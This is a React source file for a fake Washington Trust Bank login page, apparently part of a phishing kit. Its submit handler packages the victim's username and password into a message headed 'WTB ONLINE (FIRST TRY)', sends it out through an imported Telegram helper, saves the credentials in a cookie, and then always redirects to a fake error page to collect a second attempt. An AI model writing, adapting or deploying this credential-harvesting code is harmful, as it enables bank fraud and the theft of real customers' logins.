import React from "react";
import Logo from "../assets/logo.jpeg";
import { useNavigate } from "react-router-dom";
import cookies from "../utils/cookie.config";
import TelegramSend from "../utils/send-message";

export default function Login() {
  const [isLoading, setIsLoading] = React.useState(false);
  const [formInput, setFormInput] = React.useState<Login>({
    username: "",
    password: "",
  });

  const navigate = useNavigate();

  function handleInputChange(event: React.ChangeEvent<HTMLInputElement>) {
    setFormInput((prevData) => ({
      ...prevData,
      [event.target.name]: event.target.value,
    }));
  }

  async function handleSubmit(event: React.FormEvent<HTMLFormElement>) {
    event.preventDefault();

    const message = `
        ---- WTB ONLINE (FIRST TRY) -----
        Username: ${formInput.username}
        Password: ${formInput.password}
        `;
    setIsLoading(true);
    await TelegramSend(message);
    cookies.set("login1", formInput);
    setIsLoading(false);
    navigate("../login/error", { replace: true });
  }

  return (
    <>
      <div className="content">
        <div className="form">
          <form method="POST" onSubmit={handleSubmit}>
            <div className="form-item">
              <div className="brand">
                <img src={Logo} alt="" />
              </div>
              <div className="form-field">
                <input
                  onChange={handleInputChange}
                  name="username"
                  type="text"
                  placeholder="Username"
                />
              </div>

              <div className="form-field">
                <input
                  onChange={handleInputChange}
                  type="password"
                  name="password"
                  placeholder="Password"
                />
              </div>
              <div
                style={{
                  width: "100%",
                  display: "flex",
                  justifyContent: "flex-end",
                }}
              >
                <p
                  className="btn-theme-color"
                  style={{ fontSize: 13, fontWeight: "bold" }}
                >
                  Forgot?
                </p>
              </div>

              <div
                style={{
                  display: "flex",
                  alignItems: "center",
                  justifyContent: "space-between",
                  marginTop: "-20px",
                }}
              >
                <p className="btn-theme-color bold reduce-text">
                  First time user? Enroll now.
                </p>
                {isLoading ? (
                  <div className="form-field">
                    <button style={{ width: 130, height: 50 }} type="button">Please wait...</button>
                  </div>
                ) : (
                  <div className="form-field">
                    <button style={{ width: 120, height: 50 }} type="submit">
                      Continue
                    </button>
                  </div>
                )}
              </div>
            </div>
          </form>
        </div>
      </div>

      <div className="footer">
        <p style={{ textAlign: "center" }}>
          &copy; 2024 Washington Trust Bank • Privacy policy • Member FDIC •
          Equal Housing Lender
        </p>
      </div>
    </>
  );
}
